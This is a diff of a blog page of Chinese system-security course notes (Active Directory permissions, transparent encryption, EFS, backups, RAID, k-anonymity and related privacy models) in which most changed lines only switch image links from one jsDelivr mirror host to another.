-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210051779.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210051657.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210051779.png" alt=""></p>
 <p>将temp文件的三项权限赋予域本地组files。</p>
 <p>Step2 组映射：</p>
 <p>将全局组product1加入域本地组files</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210101518.png" alt="image-20220821010114287"></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210102297.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210101518.png" alt="image-20220821010114287"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210102297.png" alt=""></p>
 <p>Step3 用户映射</p>
 <p>将用户lisi加入全局组product1</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210103698.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210104420.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210103698.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210104420.png" alt=""></p>
 <p>Step4 登录lisi查看权限是否生效</p>
 <p>首先进行细粒度权限指派的验证</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106432.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106432.png" alt=""></p>
 <p>未生效时</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106735.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106735.png" alt=""></p>
 <p>生效时</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106815.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210106815.png" alt=""></p>
 <p>然后进行粗粒度权限指派的验证</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210107255.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210107255.png" alt=""></p>
 <p>确实无法登陆，成功。</p>
 <p><strong>若有多个全局组如何操作？若再用通用组简化多域管理时如何操作？</strong></p>
 <p>Step1  权限指派</p>
@@ -787,18 +787,18 @@
 <li>文件系统驱动接收IRP，确定要IO的文件位于磁盘的哪个地址（哪个块），发送给磁盘驱动</li>
 <li>磁盘驱动按照地址进行文件IO。</li>
 </ol>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210128661.png" style="zoom: 50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210128661.png" style="zoom: 50%;" /></p>
 <h5 id="基于用户模式实现"><a href="#基于用户模式实现" class="headerlink" title="基于用户模式实现"></a>基于用户模式实现</h5><p>通过API-HOOK针对进程实现加解密操作。</p>
 <p>首先向进程注入负责HOOK的dll。</p>
 <p>进程打开文件（读操作）时，该事件被HOOK拦截，先将已加密的文件拷贝到临时目录中，并隐藏和解密该文件，然后将解密后的临时文件返回给打开文件的进程。 这样应用程序打开的就是磁盘上的明文文件，用户程序可以进行正常的处理; </p>
 <p>进程关闭文件（写操作）时，该事件被HOOK拦截，将临时文件加密，然后再拷贝回来覆盖掉原文件。</p>
 <p>这种加密实质上是通过临时文件来实现的，必须在每次用户存盘或者系统自动存盘的时候，存在<strong>实现简单、易被绕过</strong>，效率低，安全性不高，兼容性差（PatchGuard随版本变化，注入方式会变化）的特点。 </p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210135003.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210135003.png" style="zoom:50%;" /></p>
 <h5 id="基于内核模式实现"><a href="#基于内核模式实现" class="headerlink" title="基于内核模式实现"></a>基于内核模式实现</h5><p>方案一：操作系统开发者</p>
 <p>文件粒度：修改文件系统驱动</p>
 <p>磁盘粒度：修改磁盘驱动</p>
 <p>读时解密，写时加密</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212147295.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212147295.png" style="zoom:50%;" /></p>
 <p>方案二：</p>
 <p>在相应驱动上面写一层过滤程序</p>
 <p>文件粒度：文件过滤驱动程序</p>
@@ -806,7 +806,7 @@
 <p>过滤：在不影响上层和下层接口的情况下，在Windows内核中加入新的层，从而不需要修改上层软件或下层的真实驱动程序就加入新的功能。</p>
 <p>文件过滤驱动程序：处理IRP包和文件</p>
 <p>磁盘过滤驱动程序：全盘加密</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212150396.png" alt="image-20220821215052250" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212150396.png" alt="image-20220821215052250" style="zoom:50%;" /></p>
 <p>Windows的内核模式透明加解密方案：EFS，Encrypting File System。</p>
 <h4 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h4><h5 id="KMS"><a href="#KMS" class="headerlink" title="KMS"></a>KMS</h5><ol>
 <li>应用系统不需要改进</li>
@@ -829,18 +829,18 @@
 <p><strong>例1 EFS的加解密系统</strong></p>
 <p>加密：</p>
 <p>与上述方案类似，但其拥有两对“KEK”，一个由用户持有，一个由恢复代理（管理员）持有，也会生成两个“DEK”（这里称为FEK）的加密文件，与密文一起存储。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212323707.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212323707.png" alt=""></p>
 <p>解密：</p>
 <p>同样有两种解密方式</p>
 <p>使用用户的KEK私钥解密DDF得到FEK，使用FEK解密密文得到明文；</p>
 <p>使用恢复代理的KEK私钥解密DRF得到FEK，使用FEK解密密文得到明文。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212324807.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208212324807.png" alt=""></p>
 <h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><h4 id="备份策略"><a href="#备份策略" class="headerlink" title="备份策略"></a>备份策略</h4><p>首先了解一个属性</p>
 <p><strong>存档属性</strong>：用来标记文件改动，代表<strong>在上一次备份后文件有所改动</strong>。意即：“我需要备份！/<strong>该存档了！</strong>”</p>
 <p>使用Attrib程序可以查看文件属性。其中，存档属性为A。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222149102.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222149102.png" alt=""></p>
 <p>可以看到我这里的PPT没有进行过备份，所以都有存档标记A。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222151961.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222151961.png" alt=""></p>
 <h5 id="完全备份"><a href="#完全备份" class="headerlink" title="完全备份"></a>完全备份</h5><p>完全备份（Full Backup）：对某一个时间点上的所有数据进行的一个完全复制。</p>
 <p>在完全备份过程中，备份选中的文件，<strong>清除存档属性</strong>，即将每个文件都被标记为已备份。</p>
 <h5 id="差异备份（偷摸备份）"><a href="#差异备份（偷摸备份）" class="headerlink" title="差异备份（偷摸备份）"></a>差异备份（偷摸备份）</h5><p>差异备份（Differential Backup）：备份自上一次备份后<strong>有存档属性的</strong>文件。（规矩上需要备份）</p>
@@ -850,30 +850,30 @@
 <p>在增量备份过程中，备份选中的、<strong>有存档属性的</strong>文件，<strong>清除存档属性</strong>。</p>
 <p>在进行恢复时，需使用上次的全备份和<strong>每次的</strong>差异备份进行恢复。</p>
 <p><strong>例1 三种备份的区别</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222203402.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222203402.png" alt=""></p>
 <p>完全备份：不考虑A，每次全部复制。</p>
 <p>差异备份：把有A的全部复制。</p>
 <p>增量备份：把有A的全部复制，然后清除它们的A。</p>
 <p><strong>例2 使用备份进行数据恢复</strong></p>
 <p>1)</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224834.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222223766.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224834.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222223766.png" alt=""></p>
 <p>2)</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224969.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222222385.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224969.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222222385.png" alt=""></p>
 <p>3)</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222225497.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224596.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222225497.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222224596.png" alt=""></p>
 <h4 id="RAID"><a href="#RAID" class="headerlink" title="RAID"></a>RAID</h4><p>独立磁盘冗余阵列（Redundant Array ofIndependent Disk，RAID）：将多块磁盘通过一定的技术手段组成一个单一的虚拟磁盘使用。</p>
 <p>软RAID：使用软件连接多块磁盘</p>
 <p>硬RAID：使用硬件连接多块磁盘</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222235585.png" alt="image-20220822223555425"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222235585.png" alt="image-20220822223555425"></p>
 <p>硬RAID有许多冗余实现方式</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222242916.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222242916.png" alt=""></p>
 <p>其中RAID-0、RAID-1、RAID-5及其组合方案最常用。</p>
 <h5 id="RAID-0"><a href="#RAID-0" class="headerlink" title="RAID-0"></a>RAID-0</h5><p>RAID-0：又称条带阵列。将数据分割存储到多块硬盘上，磁盘读写时负载平均分配到多块磁盘。由于多块磁盘可同时读写，所以速度明显提升。</p>
 <p>示意图：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222251794.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222251794.png" style="zoom:50%;" /></p>
 <p>优点：</p>
 <ol>
 <li><p>读写快</p>
@@ -889,7 +889,7 @@
 </ol>
 <h5 id="RAID-1（highlight）"><a href="#RAID-1（highlight）" class="headerlink" title="RAID-1（highlight）"></a>RAID-1（highlight）</h5><p>RAID-1：又称<strong>镜像</strong>阵列，至少由2块磁盘实现。将同样的数据写入2块硬盘（互为镜像），一块磁盘发生故障时，另一块硬盘可继续工作，并可在更换硬盘后重新创建镜像。</p>
 <p>示意图：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222245884.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222245884.png" style="zoom:50%;" /></p>
 <p>优点：</p>
 <ol>
 <li>可靠性高</li>
@@ -902,7 +902,7 @@
 </ol>
 <h5 id="RAID-0-1"><a href="#RAID-0-1" class="headerlink" title="RAID-0+1:"></a>RAID-0+1:</h5><p>RAID-1：至少由4块磁盘实现。将RAID-0中的2块磁盘视为虚拟磁盘，再使用RAID-1方案阵列</p>
 <p>示意图：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222257940.jpeg" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222257940.jpeg" style="zoom:50%;" /></p>
 <p>优点：</p>
 <ol>
 <li>读写快</li>
@@ -911,9 +911,9 @@
 <h5 id="RAID-5（highlight）"><a href="#RAID-5（highlight）" class="headerlink" title="RAID-5（highlight）"></a>RAID-5（highlight）</h5><p>RAID-5：至少由3块磁盘实现。将数据分布在不同磁盘上，并在所有磁盘上交叉地存取数据及<strong>奇偶校验信息</strong>。</p>
 <p>示意图：</p>
 <p>3块物理磁盘：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222259875.jpeg" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222259875.jpeg" style="zoom:50%;" /></p>
 <p>4块物理磁盘：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222257425.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208222257425.png" style="zoom:50%;" /></p>
 <p>RAID-5的结构共有8种，以上均为常规左异步结构的RAID-5，又称“3-2-1连续”，即：</p>
 <ol>
 <li>校验块从最后一块物理盘开始写起，然后依次往前面的物理盘中写入，当写到第一块物理盘后再回到最后一块物理盘，依次循环。</li>
@@ -959,9 +959,9 @@ c = a \oplus b\\
 <h4 id="k-匿名性（k-anonymity）"><a href="#k-匿名性（k-anonymity）" class="headerlink" title="k-匿名性（k-anonymity）"></a>k-匿名性（k-anonymity）</h4><p>k-匿名化：将某（些）列属性的具体值替换为泛化值，使其满足k-匿名性的过程，也称泛化过程。</p>
 <p>k-匿名性：当表中的每$1$个元组无法与其他至少$k-1$个元组互相区分，即$|$每个元组所在的等价类$| \geq k$时，称该表满足k-匿名性。</p>
 <p><strong>例1 2-匿名化表</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208242345542.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208242345542.png" alt=""></p>
 <p><strong>例2 4-匿名化表</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208242347840.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208242347840.png" alt=""></p>
 <p>可以看出，k值越大：</p>
 <ol>
 <li>保护强度越大</li>
@@ -976,47 +976,47 @@ c = a \oplus b\\
 <h4 id="l-多样性（l-diversity）"><a href="#l-多样性（l-diversity）" class="headerlink" title="l-多样性（l-diversity）"></a>l-多样性（l-diversity）</h4><p>由于k-匿名性不考虑敏感属性，存在同质性攻击，于是有了l-多样性。</p>
 <p>l-多样性：在k-匿名性的基础上，每个划分/等价类中至少有l种敏感属性，即$|$每个等价类的敏感属性列$| \geq l$</p>
 <p><strong>例1 4-匿名性、3-多样性表</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250017434.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250017434.png" alt=""></p>
 <p>注意：1号那里应为1305*，详见参考文献[1]中的Figure 3. 3-Diverse Inpatient Microdata</p>
 <p>偏斜性攻击：等价类中敏感属性的分布与全体数据的分布相差较大，敌手可以结合语义判断某个元组的敏感属性在那个属性上的区间。</p>
 <p><strong>例2 偏斜性攻击</strong></p>
 <p>敌手已经知道李雷位于下面的2-匿名性表、2-多样性表中，但每一个等价类的敏感属性“工资”的分布与总体分布差别较大，如第一个等价类、第二个等价类、第四个等价类的“工资”较高，第三个等价类的“工资”较低，而总体数据的“工资”有高有低。所以敌手只要判断出受害者在哪个等价类中就可以知道其“工资”的大概情况。</p>
 <p>即敌手可知：李雷，“工资”比较低。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250023040.jpeg" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250023040.jpeg" alt=""></p>
 <h4 id="t-邻近性（t-closeness）"><a href="#t-邻近性（t-closeness）" class="headerlink" title="t-邻近性（t-closeness）"></a>t-邻近性（t-closeness）</h4><p>由于l-多样性不考虑等价类与总体的分布差异，于是有了t-邻近性。</p>
 <p>t-邻近性：在每个等价类中，敏感属性的分布与全体属性的分布邻近，且不超过t。</p>
 <p><strong>例1 2-匿名性、2-多样性、t-邻近性表</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250036987.jpeg" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208250036987.jpeg" alt=""></p>
 <p>这个表是将上节例2中的数据从4-匿名性重新划分至2-匿名性所得，只有2个等价类，每个等价类中的敏感属性“工资”有高有低，所以敌手无法通过判断受害者在哪个等价类来获知其在某个语义上的区间。</p>
 <p>（每个等价类的基数越大，越接近总体的分布，这方面类似深度学习中的batch_size与accuracy的关系）</p>
 <p>注：这一节老师讲的基本来源于</p>
 <p>[1] <a target="_blank" rel="noopener" href="https://personal.utdallas.edu/~mxk055100/courses/privacy08f_files/ldiversity.pdf">l-Diversity: Privacy Beyond k-Anonymity</a></p>
 <p>[2] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA3NTQ3ODI0NA==&amp;mid=2247483923&amp;idx=1&amp;sn=bfa6d5efa074d1a93a449d66c2ee1046&amp;chksm=9f6ea798a8192e8e080afba90df416755af2586ff17d3a2c8854f89fd0e19544b5ab2ec8d0c1&amp;mpshare=1&amp;scene=23&amp;srcid=1011LAlQSjdslbo9xk70v6dw#rd">大数据时代下的隐私保护. 孙茗珅, 韦韬. 百度安全实验室. 2017(08)</a></p>
 <h4 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h4><p>例1 使用给定表形成泛化树</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207033.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251208581.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207033.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251208581.png" alt=""></p>
 <h4 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h4><p>聚类：对数据中的不同记录进行分类，每个分类中的数据属性相同或相似。</p>
 <p>使用两条记录之间的距离计算属性相似度。</p>
 <p>距离计算：</p>
 <p>数值型</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251206324.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207824.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251206324.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207824.png" alt=""></p>
 <p>语义型</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251206634.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207581.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251206634.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207581.png" alt=""></p>
 <p>例1 计算给定表中R1、R2两元组的距离</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207033.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251210475.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251207033.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251210475.png" alt=""></p>
 <p>$D_{USA-India}$：USA和India的最小公共祖先所形成的树就是整棵树，其深度为3（注意：深度从0起），故其距离为$3/3$</p>
 <p>$D<em>{41-57}=\frac{\abs{41-57}}{range</em>{age}} = \frac{57-41}{57-24}$</p>
 <p>$D<em>{Armed-Tech}$：同$D</em>{USA-India}$</p>
 <h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><p>分割：将原始数据产生满足l-多样性原则的数据划分，然后把准标识属性和敏感属性分成两个表后直接发布，两者之间通过“组号”（Group-ID）来连接。</p>
 <p><strong>例1 分割给定表</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251221215.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251221215.png" alt=""></p>
 <p>Step 1：对给定表2-匿名化、2-多样化</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251229060.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251229060.png" alt=""></p>
 <p>Step 2：根据等价类划分Group形成QIT，然后统计各Group中敏感属性的数量形成ST</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251220277.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208251220277.png" alt=""></p>
 <p>[1] <a target="_blank" rel="noopener" href="https://www.vldb.org/conf/2006/p139-xiao.pdf">Anatomy: Simple and Effective Privacy Preservation</a></p>
 <!--
 <embed src="https://xuwp.top/pdf/sosHomework1.pdf" width="100%" height="1150" type="application/pdf">
@@ -1037,209 +1037,209 @@ c = a \oplus b\\
 <p>Windows 10 1909：Client-No1</p>
 <h2 id="配置Active-Directory"><a href="#配置Active-Directory" class="headerlink" title="配置Active Directory"></a>配置Active Directory</h2><h3 id="Server-No1"><a href="#Server-No1" class="headerlink" title="Server-No1"></a>Server-No1</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>进入Windows Server Manager，点击”添加角色和功能”。</p>
 <p>连续”下一步”，直到到达”服务器角色”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191645257.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191645257.png" alt=""></p>
 <p>选中”Active Directory域服务”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648790.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648790.png" alt=""></p>
 <p>点击”添加功能”。</p>
 <p>点击”下一步”，可以看到AD DS的说明。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648773.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648773.png" alt=""></p>
 <p>连续”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648941.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648941.png" alt=""></p>
 <p>点击”将此服务器提升为域控制器”，当然也可以以后配置。</p>
 <p>这些可视化的点击步骤也可以导出为XML文件，此后使用PowerShell安装。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648993.png" alt=""></p>
-<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648392.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648993.png" alt=""></p>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648392.png" alt=""></p>
 <p>点击”添加新林”，输入根域名为”xuwp05191643.com”。</p>
 <p>点击”下一步”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648632.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648632.png" alt=""></p>
 <p>在这里输入DSRM密码，点击”下一步”。</p>
 <p>注：这里的林/域功能级别最高就是Windows Server 2016。</p>
 <p>连续”下一步”，全部使用默认值。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648422.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648422.png" alt=""></p>
 <p>我们需要留意的是这个界面，我们可以通过和此后两个服务器对比这个界面来明确概念。</p>
 <p>这里可以生成Power Shell脚本</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 用于 AD DS 部署的 Windows PowerShell 脚本</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> ADDSDeployment</span><br><span class="line"><span class="built_in">Install-ADDSForest</span> `</span><br><span class="line"><span class="literal">-CreateDnsDelegation</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-DatabasePath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-DomainMode</span> <span class="string">&quot;WinThreshold&quot;</span> `</span><br><span class="line"><span class="literal">-DomainName</span> <span class="string">&quot;xuwp05191643.com&quot;</span> `</span><br><span class="line"><span class="literal">-DomainNetbiosName</span> <span class="string">&quot;XUWP05191643&quot;</span> `</span><br><span class="line"><span class="literal">-ForestMode</span> <span class="string">&quot;WinThreshold&quot;</span> `</span><br><span class="line"><span class="literal">-InstallDns</span>:<span class="variable">$true</span> `</span><br><span class="line"><span class="literal">-LogPath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-NoRebootOnCompletion</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-SysvolPath</span> <span class="string">&quot;C:\Windows\SYSVOL&quot;</span> `</span><br><span class="line"><span class="literal">-Force</span>:<span class="variable">$true</span></span><br></pre></td></tr></table></figure>
 <p>点击”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648791.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648791.png" alt=""></p>
 <p>点击”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648781.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648781.png" alt=""></p>
 <p>点击”关闭”，等待重启。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648593.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648593.png" alt=""></p>
 <p>可以发现我们的Administrator用户前面增加了域”XUWP05191643”。</p>
 <p>进入系统后，查看系统属性。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648311.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648311.png" alt=""></p>
 <p>这表明成功创建了父域xuwp05191643.com，同时服务器Server-No1属于xuwp05191643.com</p>
 <h3 id="Server-No2"><a href="#Server-No2" class="headerlink" title="Server-No2"></a>Server-No2</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>同Server-No1</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648271.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648271.png" alt=""></p>
 <p>点击”将此服务器提升为域控制器”。</p>
 <h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>“将新域添加到现有林”-“更改”。</p>
